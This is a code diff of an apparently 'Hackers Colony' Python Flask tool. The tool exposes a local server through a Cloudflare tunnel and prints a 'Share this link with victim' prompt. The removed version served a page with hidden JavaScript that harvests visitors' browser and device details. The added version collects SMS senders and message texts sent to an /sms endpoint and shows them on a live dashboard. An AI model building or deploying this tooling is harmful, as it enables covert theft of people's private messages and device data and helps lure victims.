@@ -1,83 +1,124 @@
 import os
 import time
 import json
-import flask
 import threading
-from flask import Flask, request
+from flask import Flask, request, render_template_string
 
+PORT = 5050
 app = Flask(__name__)
+sms_data = []
 
-data_store = []
+# HTML dashboard with auto-refresh and styling
+HTML_TEMPLATE = """
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Hackers Colony | SMS Logger</title>
+    <meta http-equiv="refresh" content="5">
+    <style>
+        body {
+            background-color: #0f0f0f;
+            color: #ffffff;
+            font-family: monospace;
+            padding: 20px;
+        }
+        h1 {
+            color: #00ffcc;
+            text-align: center;
+            font-size: 32px;
+            margin-bottom: 20px;
+        }
+        .sms-block {
+            background-color: #1c1c1c;
+            border: 1px solid #00ffcc;
+            border-radius: 10px;
+            padding: 10px;
+            margin-bottom: 10px;
+        }
+        .sender {
+            color: #ff8080;
+            font-weight: bold;
+        }
+        .message {
+            color: #ffffff;
+        }
+        .timestamp {
+            color: #999999;
+            font-size: 12px;
+        }
+    </style>
+</head>
+<body>
+    <h1>📱 Hackers Colony - SMS Logger</h1>
+    {% for sms in sms_data %}
+        <div class="sms-block">
+            <div class="sender">📨 From: {{ sms['sender'] }}</div>
+            <div class="message">💬 {{ sms['message'] }}</div>
+            <div class="timestamp">🕒 {{ sms['timestamp'] }}</div>
+        </div>
+    {% else %}
+        <p>No SMS data received yet.</p>
+    {% endfor %}
+</body>
+</html>
+"""
 
-@app.route('/')
+@app.route("/")
 def index():
-    return '''
-    <h1>HCO-DataSnag</h1>
-    <p>This is an educational tool by <b>Hackers Colony</b>.</p>
-    <script>
-    const data = {
-        userAgent: navigator.userAgent,
-        language: navigator.language,
-        platform: navigator.platform,
-        screen: {
-            width: screen.width,
-            height: screen.height
-        },
-        url: window.location.href
-    };
-    fetch("/collect", {
-        method: "POST",
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify(data)
-    });
-    </script>
-    '''
+    return render_template_string(HTML_TEMPLATE, sms_data=sms_data)
 
-@app.route('/collect', methods=['POST'])
-def collect():
+@app.route("/sms", methods=["POST"])
+def receive_sms():
+    data = request.get_json()
+    if data:
+        sms_data.append({
+            "sender": data.get("sender", "Unknown"),
+            "message": data.get("message", "No message"),
+            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
+        })
+        return "SMS received", 200
+    return "Invalid data", 400
+
+def start_flask():
     try:
-        info = request.get_json()
-        data_store.append(info)
-        print(f"[+] Victim Info Received:\n{json.dumps(info, indent=4)}\n")
-    except Exception as e:
-        print(f"[!] Error parsing victim data: {e}")
-    return "OK"
+        app.run(host="0.0.0.0", port=PORT)
+    except OSError as e:
+        print(f"[×] Port {PORT} is busy. Retrying in 5 seconds...")
+        time.sleep(5)
+        start_flask()
 
-def run_flask():
-    app.run(host="0.0.0.0", port=5050)
-
-def start_cloudflared():
-    os.system("pkill cloudflared > /dev/null 2>&1")
-    os.system("cloudflared tunnel --url http://localhost:5050 > cf.log 2>&1 &")
-    time.sleep(8)
+def start_cloudflare():
+    os.system(f"pkill cloudflared")
+    time.sleep(2)
+    os.system(f"cloudflared tunnel --url http://localhost:{PORT} --logfile cf.log --loglevel info &")
+    time.sleep(6)
 
     try:
-        with open("cf.log", "r") as file:
-            content = file.read()
-            for line in content.splitlines():
+        with open("cf.log", "r") as log:
+            for line in log:
                 if "trycloudflare.com" in line:
-                    link = line.strip().split(" ")[-1]
-                    print(f"[✓] Share this link with victim: {link}")
-                    return
-    except:
-        pass
+                    parts = line.split(" ")
+                    for part in parts:
+                        if "https://" in part and "trycloudflare.com" in part:
+                            print(f"[✓] Share this link with victim: {part.strip()}")
+                            return
+        print("[×] Failed to get Cloudflare URL. Make sure tunnel started properly.")
+    except FileNotFoundError:
+        print("[×] cf.log not found. Cloudflare tunnel may not have started.")
 
-    print("[×] Failed to get Cloudflare URL. Make sure tunnel started properly.")
+def run_server():
+    while True:
+        print("[•] Starting Flask server...")
+        flask_thread = threading.Thread(target=start_flask)
+        flask_thread.daemon = True
+        flask_thread.start()
 
-def main():
-    print("[•] Installing requirements...")
-    os.system("pip install flask > /dev/null 2>&1")
-    print("[•] Redirecting to YouTube in 8 seconds...")
-    time.sleep(8)
-    os.system("am start -a android.intent.action.VIEW -d https://youtube.com/@hackers_colony_tech?si=pvdCWZggTIuGb0ya")
-    input("Press ENTER after subscribing to continue...")
+        print("[•] Starting Cloudflare tunnel...")
+        start_cloudflare()
 
-    print("[•] Starting Flask server...")
-    threading.Thread(target=run_flask).start()
-    time.sleep(4)
-
-    print("[•] Starting Cloudflare tunnel...")
-    start_cloudflared()
+        flask_thread.join()
+        print("[!] Flask crashed or exited. Restarting in 3 seconds...")
+        time.sleep(3)
 
 if __name__ == "__main__":
-    main()
+    run_server()
